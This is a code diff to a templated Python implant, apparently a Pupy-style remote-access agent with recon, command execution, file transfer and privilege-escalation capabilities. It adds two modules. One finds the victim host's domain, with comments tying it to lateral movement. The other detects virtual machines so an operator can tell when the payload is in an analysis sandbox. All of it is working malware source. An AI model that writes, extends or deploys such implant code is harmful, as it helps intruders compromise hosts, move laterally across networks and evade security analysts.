@@ -644,6 +644,8 @@ def _action_bind() -> None:
     table["getpid"] = lambda task: mod_getpid()
     table["getuid"] = lambda task: mod_getuid()
     table["getppid"] = lambda task: mod_getppid()
+    table["getdomain"] = lambda task: mod_getdomain()
+    table["check_vm"] = lambda task: mod_check_vm()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -719,7 +721,8 @@ _OBF = _NoopObf()
 # the obfuscation level.
 CAPABILITIES = [
     {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
-                    "getpid", "getuid", "getppid",{% endif %}
+                    "getpid", "getuid", "getppid",
+                    "getdomain", "check_vm",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1659,6 +1662,82 @@ def mod_getppid():
         return {"error": f"cannot read the parent pid: {exc}"}
 
 
+def mod_getdomain():
+    """The DNS/AD domain the host belongs to.
+
+    Upstream Pupy's ``getdomain``. An empty answer is meaningful, not a failure:
+    it means the host is in a workgroup rather than a domain, which changes what
+    lateral movement is even possible.
+    """
+    domain = ""
+    try:
+        if _pf.system().lower().startswith("win"):
+            domain = _o.environ.get("USERDNSDOMAIN") or _o.environ.get("USERDOMAIN") or ""
+        else:
+            try:
+                p = _sp.run(["dnsdomainname"], capture_output=True, text=True, timeout=10)
+                domain = (p.stdout or "").strip()
+            except Exception:
+                domain = ""
+            if not domain:
+                try:
+                    with open("/etc/resolv.conf") as fh:
+                        for line in fh:
+                            if line.startswith("search") or line.startswith("domain"):
+                                parts = line.split()
+                                if len(parts) > 1:
+                                    domain = parts[1]
+                                    break
+                except Exception:
+                    domain = ""
+        return {"domain": domain, "joined": bool(domain)}
+    except Exception as exc:
+        return {"error": f"cannot determine the domain: {exc}"}
+
+
+def mod_check_vm():
+    """Whether the host looks virtualised.
+
+    Upstream Pupy's ``check_vm``. Reports the indicators it matched rather than
+    only a boolean, because 'is_vm' without the evidence is not actionable -- an
+    operator needs to know WHICH signal fired before deciding a payload is in an
+    analysis VM. A False verdict is a real answer, not an absent one.
+    """
+    markers = ("vmware", "virtualbox", "vbox", "qemu", "kvm", "xen", "hyper-v",
+               "hyperv", "parallels", "bhyve", "bochs", "innotek", "microsoft corporation")
+    indicators = []
+    try:
+        for path in ("/sys/class/dmi/id/product_name",
+                     "/sys/class/dmi/id/sys_vendor",
+                     "/sys/class/dmi/id/board_vendor"):
+            try:
+                with open(path) as fh:
+                    value = fh.read().strip()
+                if value and any(m in value.lower() for m in markers):
+                    indicators.append(f"{path}={value}")
+            except Exception:
+                continue
+        try:
+            with open("/proc/cpuinfo") as fh:
+                if "hypervisor" in fh.read().lower():
+                    indicators.append("cpuinfo:hypervisor flag")
+        except Exception:
+            pass
+        if _pf.system().lower().startswith("win"):
+            try:
+                import winreg
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                                    r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum") as key:
+                    value = str(winreg.QueryValueEx(key, "0")[0]).lower()
+                if any(m in value for m in markers):
+                    indicators.append(f"disk enum={value}")
+            except Exception:
+                pass
+        return {"is_vm": bool(indicators), "indicators": indicators}
+    except Exception as exc:
+        return {"error": f"cannot assess virtualisation: {exc}"}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2358,7 +2437,8 @@ def _register(transport) -> tuple:
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
             {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
-                    "getpid", "getuid", "getppid",{% endif %}
+                    "getpid", "getuid", "getppid",
+                    "getdomain", "check_vm",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2485,6 +2565,7 @@ def _parse_command(text: str) -> dict:
     v, arg = verb.lower(), text[len(verb):].strip()
     if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid", "env",
              "date", "alive", "getpid", "getuid", "getppid",
+             "getdomain", "check_vm",
              "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
